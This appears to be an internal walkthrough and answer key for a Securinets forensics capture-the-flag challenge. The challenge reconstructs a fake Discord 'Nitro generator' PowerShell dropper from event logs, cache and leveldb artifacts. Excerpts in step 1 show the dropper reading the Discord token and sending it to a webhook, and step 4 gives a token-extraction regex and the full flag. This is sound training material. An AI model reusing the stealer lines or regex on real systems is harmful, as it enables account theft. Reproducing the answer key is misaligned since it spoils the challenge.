# #20 "Nitro" — Walkthrough (INTERNAL)

**Category:** DFIR triage — disk/app artifacts + event logs + social engineering + RE · **Tier:** 🟡🟠
**Artifact:** `DESKTOP-7K2X9QP_triage.zip` — a full triage (hives, all `.evtx`, Amcache, Prefetch, `bayrem` profile)
**Flag:** `Securinets{n1tr0_g3n_w4s_f4k3_st34l_th3_t0k3n}`
- partA `n1tr0_g3n_w4s_f4k3` — in the deobfuscated dropper (and captured in the PS Operational log)
- partB `st34l_th3_t0k3n` — `XOR(embedded blob, sha256(<the Discord token>))`

---

## What it teaches
Reconstruct an intrusion from a **triage collection** with no pointers: pivot from execution
evidence (PowerShell script-block logging) to the dropped file, deobfuscate it, recover the
Discord token from Local Storage, carve the social-engineering lures from the Discord cache — and
realise the flag's second half needs the stolen token.

| Skill | Where |
|---|---|
| PowerShell script-block logging (EID 4104) | `Microsoft-Windows-PowerShell%4Operational.evtx` — the deobfuscated stage-2 in cleartext |
| Process-creation / console history | `Security.evtx` (4688), `ConsoleHost_history.txt` |
| Peeling `base64 → gzip → XOR` PowerShell | `Downloads\FreeNitroGen.ps1` |
| Discord token from `Local Storage\leveldb` | regex over the leveldb files |
| Carving lures from a Chromium Simple-Cache | `discord\Cache\Cache_Data\f_*` (binwalk/photorec) |
| `Zone.Identifier` Mark-of-the-Web | proves the CDN origin |

---

## Intended path (one order of many)

### 1. What ran — the event logs
Parse `Microsoft-Windows-PowerShell%4Operational.evtx` (EvtxECmd / Windows Event Viewer). The
**4104** script-block events contain a self-decoding script `FreeNitroGen.ps1` **and** the
deobfuscated **stage-2** it `Invoke-Expression`'d:
```
$lp = "$env:APPDATA\discord\Local Storage\leveldb"     # reads the Discord token
Invoke-RestMethod ... discord.com/api/webhooks/...      # beacons it out
# reward_a = Securinets{n1tr0_g3n_w4s_f4k3               <- part A
$blob = FromBase64String("4mXsS8mrvI4l0BV2Gkmk")        # part B, locked to the token
```
`Security.evtx` (4688) and `ConsoleHost_history.txt` corroborate `bayrem` running it from Downloads.
(Or skip the logs and deobfuscate `Downloads\FreeNitroGen.ps1` by hand: `base64 → gunzip → XOR "nitr0"`.)

### 2. Where it came from — Mark-of-the-Web
`Downloads\FreeNitroGen.ps1.Zone.Identifier` →
`HostUrl=https://cdn.discordapp.com/attachments/.../FreeNitroGen.ps1`.

### 3. The con — carve the Discord cache
`AppData\Roaming\discord\Cache\Cache_Data\f_0000*` are Simple-Cache entries keyed by
`cdn.discordapp.com/attachments/.../*.png` (visible with `strings`); carve the bodies
(`binwalk -e` / `photorec`) → three lure PNGs: fake "Nitro gift", "how to claim", "download +
run as admin" from `zyzz`.

### 4. The token — leveldb
```
grep -rhoaE '[A-Za-z0-9_-]{24,26}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}' \
   "AppData/Roaming/discord/Local Storage/leveldb/"
→ MzI1NjE0OTU4MDEyMzQ1Njc4.Gk2xQp.9fW3rT5yH8jK-bN0pL4mZ7sV2cX1qA
```

### 5. Finish it — part B needs the token
```
k  = sha256(token).digest()
pb = "".join(chr(blob[i] ^ k[i]) for i in range(len(blob)))   # -> st34l_th3_t0k3n
```
`Securinets{n1tr0_g3n_w4s_f4k3_st34l_th3_t0k3n}`

---

## Trick & red herrings
- **Trick:** the flag can't be finished from the malware alone — partB is bound to the recovered
  Discord token, forcing both the app-artifact recovery and the RE.
- **Red herrings:** Downloads also holds benign installers (`7z`, `putty`, `Q3_report.zip`) from the
  seeded history; the webhook URL and "run as admin" pressure are period detail, not the key.

---

## Build notes
Built on `ctf-win` `golden-nodef` (Defender off), headless via `guestcontrol`. Dropper executed
for real (script-block logging **on**) so the 4104 capture is genuine. **Acquisition offline &
contamination-controlled:** `clonemedium` → **TSK** extracted the KAPE-style target set (hives,
all `.evtx`, Amcache, Prefetch, profile); the raw `$MFT`/`$LogFile`/`$J` are deliberately **not**
shipped because they'd carry deleted build-script filenames (#18 already showcases those). All
build tooling was scrubbed and the leaky logs (PS Operational/classic, Security) cleared before
the single clean incident run; verified end-to-end from the shipped zip (`build/ch20/solve20b.py`):
token → CDN → deobfuscate → partA (also in 4104) → partB; lures carve; partB absent from every
shipped file; no author identity / tooling-name leaks. Answer key stays in `build/ch20`.

**Fidelity notes:** Discord doesn't persist DM text on disk, so the conversation is the cached
lure **images** (user-chosen route). The dropper was launched via guest control, so its 4688
parent is the guest-control host rather than `explorer.exe` — a minor synthetic detail.
